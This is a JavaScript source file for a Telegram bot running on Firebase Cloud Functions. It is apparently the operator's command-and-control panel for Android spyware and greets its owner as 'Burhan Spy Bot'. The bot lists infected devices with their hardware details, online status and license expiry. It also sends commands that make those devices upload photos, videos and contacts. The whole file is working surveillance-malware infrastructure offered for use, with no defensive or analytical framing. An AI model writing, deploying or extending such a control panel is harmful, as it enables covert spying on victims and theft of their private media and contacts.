// bot.js
const functions = require('firebase-functions');
const admin = require('firebase-admin');
const TelegramBot = require('node-telegram-bot-api');

// Initialize Firebase Admin SDK with explicit database URL
admin.initializeApp({
  databaseURL: process.env.FIREBASE_DATABASE_URL
});

const db = admin.database();

// Environment variables
const token = process.env.TOKEN;
const OWNER_ID = parseInt(process.env.OWNER_ID, 10); // Convert to number

// Initialize bot with polling set to false (we'll use webhook)
const bot = new TelegramBot(token, { polling: false });

// Helper function to check authorization
function isAuthorized(userId) {
  return userId === OWNER_ID;
}

// 1. DEVICES LIST
bot.onText(/\/devices/, (msg) => {
  const chatId = msg.chat.id;
  if (!isAuthorized(msg.from.id)) return bot.sendMessage(chatId, "⛔ Access Denied!");

  db.ref('devices').once('value')
    .then(snapshot => {
      const devices = snapshot.val() || {};
      const deviceEntries = Object.entries(devices);
      const online = deviceEntries.filter(([id, d]) => d.online === true);
      const offline = deviceEntries.filter(([id, d]) => d.online !== true);

      let message = `📱 ALL DEVICES (Total: ${deviceEntries.length})\n\n`;
      message += `🟢 ONLINE (${online.length}):\n`;
      online.forEach(([id, d]) => {
        message += `🔑 ID: ${id}\n🔑 Key: ${d.deviceName || 'N/A'}\n📅 Expiry: ${d.expiry || 'N/A'}\n📱 Android: ${d.android || 'N/A'}\n💾 RAM: ${d.ram || 'N/A'} MB\n📦 Storage: ${d.storage || 'N/A'} GB\n🔋 Battery: ${d.battery || 'N/A'}%\n📊 Status: 🟢 ONLINE\n🕒 ${d.time || 'N/A'}\n\n`;
      });

      message += `\n🔴 OFFLINE (${offline.length}):\n`;
      offline.forEach(([id, d]) => {
        message += `🔑 ID: ${id}\n🔑 Key: ${d.deviceName || 'N/A'}\n📅 Expiry: ${d.expiry || 'N/A'}\n📱 Android: ${d.android || 'N/A'}\n💾 RAM: ${d.ram || 'N/A'} MB\n📦 Storage: ${d.storage || 'N/A'} GB\n🔋 Battery: ${d.battery || 'N/A'}%\n📊 Status: 🔴 OFFLINE\n🕒 ${d.time || 'N/A'}\n\n`;
      });

      bot.sendMessage(chatId, message);
    })
    .catch(err => {
      console.error('Error fetching devices:', err);
      bot.sendMessage(chatId, '❌ Error fetching devices.');
    });
});

// 2. STATS
bot.onText(/\/stats/, (msg) => {
  const chatId = msg.chat.id;
  if (!isAuthorized(msg.from.id)) return bot.sendMessage(chatId, "⛔ Access Denied!");

  db.ref('devices').once('value')
    .then(snapshot => {
      const devices = snapshot.val() || {};
      bot.sendMessage(chatId, `📊 Total Devices: ${Object.keys(devices).length}`);
    })
    .catch(err => {
      console.error('Error fetching stats:', err);
      bot.sendMessage(chatId, '❌ Error fetching stats.');
    });
});

// 3. GET PHOTO
bot.onText(/\/getphoto (.+) (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const deviceId = match[1];
  const photoPath = match[2];
  if (!isAuthorized(msg.from.id)) return bot.sendMessage(chatId, "⛔ Access Denied!");

  db.ref('commands').child(deviceId).set('get_photo')
    .then(() => bot.sendMessage(chatId, `📸 Photo request sent for device ${deviceId}...`))
    .catch(err => {
      console.error('Error sending command:', err);
      bot.sendMessage(chatId, '❌ Failed to send command.');
    });
});

// 4. GET VIDEO
bot.onText(/\/getvideo (.+) (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const deviceId = match[1];
  const videoPath = match[2];
  if (!isAuthorized(msg.from.id)) return bot.sendMessage(chatId, "⛔ Access Denied!");

  db.ref('commands').child(deviceId).set('get_video')
    .then(() => bot.sendMessage(chatId, `📹 Video request sent for device ${deviceId}...`))
    .catch(err => {
      console.error('Error sending command:', err);
      bot.sendMessage(chatId, '❌ Failed to send command.');
    });
});

// 5. CONTACTS
bot.onText(/\/contacts (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const deviceId = match[1];
  if (!isAuthorized(msg.from.id)) return bot.sendMessage(chatId, "⛔ Access Denied!");

  db.ref('commands').child(deviceId).set('get_contacts')
    .then(() => bot.sendMessage(chatId, `📞 Contacts request sent for device ${deviceId}...`))
    .catch(err => {
      console.error('Error sending command:', err);
      bot.sendMessage(chatId, '❌ Failed to send command.');
    });
});

// 6. PING
bot.onText(/\/ping (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const deviceId = match[1];
  if (!isAuthorized(msg.from.id)) return bot.sendMessage(chatId, "⛔ Access Denied!");

  db.ref('commands').child(deviceId).set('ping')
    .then(() => bot.sendMessage(chatId, `📡 Ping sent for device ${deviceId}...`))
    .catch(err => {
      console.error('Error sending command:', err);
      bot.sendMessage(chatId, '❌ Failed to send command.');
    });
});

// 7. HELP
bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;
  if (!isAuthorized(msg.from.id)) return bot.sendMessage(chatId, "⛔ Access Denied!");

  bot.sendMessage(chatId, `📜 **HELP MENU**\n\n🟢 /devices - List all devices\n🟢 /stats - Total devices\n🟢 /getphoto <ID> <PATH> - Get photo\n🟢 /getvideo <ID> <PATH> - Get video\n🟢 /contacts <ID> - Get contacts\n🟢 /ping <ID> - Check device alive\n🟢 /help - Show this menu`);
});

// 8. START
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  if (!isAuthorized(msg.from.id)) return bot.sendMessage(chatId, "⛔ Access Denied!");

  bot.sendMessage(chatId, `🔥 Welcome to Burhan Spy Bot! 🔥\n\n🎯 Owner: Sheikh Burhan\n\n📜 Commands:\n/devices - View all devices\n/stats - Total devices\n/getphoto - Get Photo\n/getvideo - Get Video\n/contacts - Fetch contacts\n/ping - Check device alive\n/help - Commands ka format`);
});

// 9. WEBHOOK RECEIVER (Cloud Function)
exports.telegramWebhook = functions.https.onRequest((req, res) => {
  bot.processUpdate(req.body);
  res.status(200).send("OK");
});

// 10. SET WEBHOOK (Cloud Function) - call this once via HTTP to set the webhook
exports.setWebhook = functions.https.onRequest(async (req, res) => {
  const webhookUrl = `https://${process.env.GCLOUD_REGION}-${process.env.PROJECT_ID}.cloudfunctions.net/telegramWebhook`;
  try {
    await bot.setWebHook(webhookUrl);
    res.status(200).send("Webhook set successfully");
  } catch (error) {
    console.error('Error setting webhook:', error);
    res.status(500).send("Failed to set webhook");
  }
});
